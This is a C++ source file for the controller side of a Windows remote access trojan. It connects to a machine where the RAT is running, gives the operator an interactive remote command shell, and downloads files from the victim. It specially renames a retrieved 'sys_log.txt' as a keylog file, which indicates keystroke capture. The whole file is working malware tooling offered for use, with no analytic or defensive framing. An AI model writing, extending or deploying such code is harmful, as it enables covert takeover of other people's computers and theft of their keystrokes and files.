#include <iostream>
#include <string>
#include <vector>
#include <fstream>
#include <sstream>

// Windows API and Winsock headers
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>

// Linker directives (IMPORTANT: Must be included during compilation)
#pragma comment(lib, "Ws2_32.lib")

// --- Configuration ---
// IMPORTANT: Replace this with the actual IP address of the target machine (where the RAT is running)
#define TARGET_IP "127.0.0.1" 
#define TARGET_PORT 4444

// --- Communication Wrappers ---

// Sends data reliably over the socket, appending a newline delimiter.
void reliable_send(SOCKET s, const std::string& data) {
    std::string message = data + "\n";
    send(s, message.c_str(), message.length(), 0);
}

// Receives data reliably from the socket until a newline delimiter is found.
std::string reliable_recv(SOCKET s) {
    std::string received_data;
    char buffer[4096];
    int bytesRead = 0;

    // Loop to read all chunks until a delimiter or connection close
    while ((bytesRead = recv(s, buffer, sizeof(buffer) - 1, 0)) > 0) {
        buffer[bytesRead] = '\0';
        received_data += buffer;

        // Check for the newline delimiter
        if (received_data.find('\n') != std::string::npos) {
            // Trim the delimiter and return
            return received_data.substr(0, received_data.find('\n'));
        }

        // If bytesRead is less than the buffer size, it might be the end of the stream, 
        // though we rely mainly on the newline delimiter from the server.
    }

    // Return empty string on error or disconnection
    return ""; 
}


// --- File Download Handler ---

// Handles the special download command protocol used by the server RAT
void handle_download(SOCKET s, const std::string& command) {
    // 1. Send the download command to the server
    reliable_send(s, command);

    // 2. Receive the file start/size message
    std::string size_msg = reliable_recv(s);

    if (size_msg.empty()) {
        std::cerr << "[-] Target connection closed or no response received.\n";
        return;
    }

    if (size_msg.substr(0, 5) == "ERROR") {
        std::cerr << "[-] Server returned error: " << size_msg << "\n";
        return;
    }

    // Expecting: FILE_START:<size>
    if (size_msg.substr(0, 11) != "FILE_START:") {
        std::cout << "Server Response: " << size_msg << "\n";
        return;
    }

    // Extract file size
    std::string size_str = size_msg.substr(11);
    long long file_size;
    try {
        file_size = std::stoll(size_str);
    } catch (...) {
        std::cerr << "[-] Invalid file size received from server.\n";
        return;
    }
    
    // Extract filename from the command for local saving
    std::string local_filename;
    size_t last_space = command.find_last_of(' ');
    if (last_space != std::string::npos) {
        local_filename = command.substr(last_space + 1);
        if (local_filename == "sys_log.txt") {
            local_filename = "keylog_" + std::to_string(std::chrono::duration_cast<std::chrono::seconds>(std::chrono::system_clock::now().time_since_epoch()).count()) + ".log";
        }
    } else {
        local_filename = "downloaded_file.dat";
    }

    // 3. Receive the file content
    std::ofstream outfile(local_filename, std::ios::binary);
    if (!outfile.is_open()) {
        std::cerr << "[-] Could not open file " << local_filename << " for saving locally.\n";
        return;
    }

    std::cout << "[*] Downloading " << file_size << " bytes to " << local_filename << "...\n";

    long long total_received = 0;
    char file_buffer[4096];
    
    // Read the exact number of bytes expected
    while (total_received < file_size) {
        long long to_receive = std::min((long long)sizeof(file_buffer), file_size - total_received);
        int bytes_received_content = recv(s, file_buffer, (int)to_receive, 0);

        if (bytes_received_content <= 0) {
            std::cerr << "[-] File download interrupted or connection closed prematurely.\n";
            outfile.close();
            return;
        }

        outfile.write(file_buffer, bytes_received_content);
        total_received += bytes_received_content;
    }

    outfile.close();
    std::cout << "[+] Download complete. Saved to " << local_filename << "\n";
}


// --- Main Client Logic ---

int main() {
    // 1. Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "[-] WSAStartup failed. Error: " << WSAGetLastError() << "\n";
        return 1;
    }

    SOCKET C2_Socket = INVALID_SOCKET;
    
    // 2. Create the socket
    C2_Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (C2_Socket == INVALID_SOCKET) {
        std::cerr << "[-] Socket creation failed. Error: " << WSAGetLastError() << "\n";
        WSACleanup();
        return 1;
    }

    // 3. Define the target address
    sockaddr_in targetAddr;
    targetAddr.sin_family = AF_INET;
    targetAddr.sin_port = htons(TARGET_PORT);
    
    // Convert IP string to binary form
    if (inet_pton(AF_INET, TARGET_IP, &targetAddr.sin_addr) <= 0) {
        std::cerr << "[-] Invalid target IP address or address not supported.\n";
        closesocket(C2_Socket);
        WSACleanup();
        return 1;
    }

    // 4. Connect to the target
    std::cout << "[*] Attempting to connect to target: " << TARGET_IP << ":" << TARGET_PORT << "...\n";
    if (connect(C2_Socket, (SOCKADDR*)&targetAddr, sizeof(targetAddr)) == SOCKET_ERROR) {
        std::cerr << "[-] Connection failed. Error: " << WSAGetLastError() << ". Ensure the RAT is running and the IP/Port are correct.\n";
        closesocket(C2_Socket);
        WSACleanup();
        return 1;
    }

    std::cout << "[+] Connection successful! Type 'quit' or 'exit' to close the shell.\n";

    // 5. Start the interactive command loop
    std::string command;
    while (true) {
        std::cout << "LO_C2> ";
        std::getline(std::cin, command);
        
        if (command == "quit" || command == "exit") {
            reliable_send(C2_Socket, "quit"); // Tell the server to clean up
            break;
        }

        if (command.empty()) {
            continue;
        }

        // Special handling for file downloads (must be handled by client first)
        if (command.substr(0, 8) == "download" || command == "get_log") {
            handle_download(C2_Socket, command);
        } else {
            // General command execution
            reliable_send(C2_Socket, command);
            std::string result = reliable_recv(C2_Socket);

            if (result.empty()) {
                std::cerr << "\n[-] Connection lost to target.\n";
                break;
            }
            std::cout << result << "\n";
        }
    }

    // 6. Cleanup
    closesocket(C2_Socket);
    WSACleanup();
    
    std::cout << "[*] C2 Client session closed.\n";
    return 0;
}